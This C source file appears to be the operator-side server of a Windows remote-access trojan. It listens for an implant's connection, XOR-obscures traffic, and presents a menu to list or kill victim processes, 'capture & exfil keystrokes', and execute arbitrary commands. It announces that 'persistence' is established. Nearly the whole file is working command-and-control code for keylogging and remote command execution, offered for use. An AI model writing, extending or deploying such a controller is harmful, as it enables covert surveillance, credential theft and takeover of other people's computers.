// Reference: https://docs.microsoft.com/en-us/windows/win32/winsock/complete-server-code

#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <string.h>

#include "defines.h"

// Need to link with Ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")


/*
 * XOR encrypts/decrypts n bytes starting at dst
 * 
 * void *dst: buffer to encrypt
 * int n: how many bytes to encrypt starting from dst
 */
void *cipher(void *dst, int n)
{
    char *pd = (char *)dst;

    while (n-- && *pd != (*pd++ ^= XOR))
        ;
}

int main(void)
{
    // Contains information about the Windows Sockets implementation. It receives this information from WSAStartup.
    WSADATA wsaData;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    // https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-addrinfoa?redirectedfrom=MSDN
    // addrinfo structures are used by the getaddrinfo function to hold host address information
    struct addrinfo *result = NULL; // Contains response information about the host
    struct addrinfo hints;          // Provides hints about the type of socket the caller supports

    char recvbuf[NETSIZE];
    int recvbuflen = NETSIZE;

    char sendbuf[NETSIZE];
    int sendbuflen = NETSIZE;

    // Initiates use of the Winsock DLL by a process, fills wsaData with information about the Sockets implementation
    if (WSAStartup(MAKEWORD(2, 2), &wsaData))
        return 1;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;       // AF_INET is used to specify the IPv4 address family
    hints.ai_socktype = SOCK_STREAM; // SOCK_STREAM is used to specify a stream socket
    hints.ai_protocol = IPPROTO_TCP; // IPPROTO_TCP is used to specify the TCP protocol
    hints.ai_flags = AI_PASSIVE;     // AI_PASSIVE flag indicates the caller intends to use the returned socket in a call to bind

    // https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo
    // Resolve the server address and port (translates an ANSI host name to an address)
    if (getaddrinfo(SERVER, SPORT, &hints, &result))
    {
        WSACleanup();
        return 1;
    }

    // Create a socket that will be bound to a specific transport service provider (types this server supports)
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) // If error, INVALID_SOCKET is returned
    {
        printf("socket failed with error: %ld\n", WSAGetLastError());

        // https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-freeaddrinfo
        // Frees the host response information
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind
    // Associates the now resolved address with the bound socket
    if (bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) // If error, SOCKET_ERROR is returned
    {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(result);

    // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen
    // Places a socket in a state in which it is listening for an incoming connection
    if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) // If error, SOCKET_ERROR is returned
    {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    printf("Waiting for connection . . .\n\n");

    // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept
    // Accept an incoming connection attempt on the listening socket (ListenSocket)
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) // If error, INVALID_ERROR is returned
    {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // No longer need server socket
    closesocket(ListenSocket);

    printf("[+] Connected! Persistence established if :)\n\n");

    // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv
    // Receives data from a connected socket or a bound connectionless socket
    recv(ClientSocket, recvbuf, recvbuflen, 0); // Receive the client hello message

    printf("-------------------------------------------------------------------------------\n");
    // The client sends encrypted data, so decipher what was just received
    cipher(recvbuf, recvbuflen);

    // Space the timestamp evenly (centered) in the console window
    int numspace = 0;
    numspace = 40 - (strlen(recvbuf) / 2) - 1;
    while (numspace--)
        printf(" ");
    printf("%s\n", recvbuf);
    printf("-------------------------------------------------------------------------------\n\n");

    // Allocate a buffer to store the most recent client ID (so the server can query it whenever)
    char *lastID = (char *)malloc(recvbuflen * sizeof(char));

    while (1)
    {
        printf(
            "\t                     Syntax: CMD PARAMETERS                   \n"
            "\t     +-----+----------------+-----------------------------+   \n"
            "\t     | CMD |   PARAMETERS   |         DESCRIPTION         |   \n"
            "\t     |-----+----------------+-----------------------------|   \n"
            "\t     |     |                |                             |   \n"
            "\t     |  1  | none           | List processes              |   \n"
            "\t     |     |                |                             |   \n"
            "\t     |-----+----------------+-----------------------------|   \n"
            "\t     |     |                |                             |   \n"
            "\t     |  2  | [NAME]         | Kill a process (case sens)  |   \n"
            "\t     |     |                |                             |   \n"
            "\t     |-----+----------------+-----------------------------|   \n"
            "\t     |     |                |                             |   \n"
            "\t     |  3  | [# KEYS]       | Capture & exfil keystrokes  |   \n"
            "\t     |     |                |                             |   \n"
            "\t     |-----+----------------+-----------------------------|   \n"
            "\t     |     |                |                             |   \n"
            "\t     |  4  | [CMD] && [CMD] | Execute arbitrary commands  |   \n"
            "\t     |     |                |                             |   \n"
            "\t     +----------------------------------------------------+   \n");

        printf("\n\t\t[...] ");
        fgets(sendbuf, sizeof(sendbuf) - 1, stdin); // Get input from user

        // If nothing was entered
        if (sendbuf[0] == '\n' || (sendbuf[0] == '2' && !*(sendbuf + 2)) || (sendbuf[0] == '4' && !*(sendbuf + 2)))
            continue;

        // If there is a guaranteed delay before response
        if (sendbuf[0] == '3')
            printf("\n\t\t    [WAIT] Capturing %i keystrokes . . .", *(sendbuf + 2) ? atoi(sendbuf + 2) : NUMKEYS);

        // Strip off the newline character before sending to client
        strtok(sendbuf, "\n");

        // Encrypt the command before sending it to the client
        cipher(sendbuf, sendbuflen);

        // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
        if (send(ClientSocket, sendbuf, sizeof(sendbuf), 0) == SOCKET_ERROR) // If error, returns SOCKET_ERROR
        {
            printf("send failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            return 1;
        }

        // First receive the client identifier with an updated timestamp
        recv(ClientSocket, recvbuf, recvbuflen, 0);

        printf("\n-------------------------------------------------------------------------------\n\n");
        // Decipher the updated timestamp
        cipher(recvbuf, recvbuflen);

        // Save it to the buffer allocated earlier
        strncpy(lastID, recvbuf, strlen(recvbuf));

        // Space the timestamp evenly (centered) in the console window
        numspace = 40 - (strlen(recvbuf) / 2) - 1;
        while (numspace--)
            printf(" ");
        printf("%s\n\n", recvbuf);

        // Unknown how much data the client is about to send, so receive until recv returns 0 (meaning failed connection)
        while (recv(ClientSocket, recvbuf, recvbuflen, 0) > 0)
        {
            // Decipher each packet we receive and print it
            cipher(recvbuf, recvbuflen);
            printf("%s", recvbuf);

            // If the client sends a non-full buffer, it MUST be the last one
            if (strlen(recvbuf) < recvbuflen)
                break;
        }

        // Again, print the most up to date identifier
        printf("\n\n-------------------------------------------------------------------------------\n");
        numspace = 40 - (strlen(lastID) / 2) - 1;
        while (numspace--)
            printf(" ");
        printf("%s\n", lastID);
        printf("-------------------------------------------------------------------------------\n\n");
        
    }

    // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-shutdown
    // Shutdown the connection, SD_SEND describes what types of operations will no longer be allowd
    if (shutdown(ClientSocket, SD_SEND) == SOCKET_ERROR)
    {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    // Cleanup
    free(lastID);
    closesocket(ClientSocket);
    WSACleanup();

    return 0;
}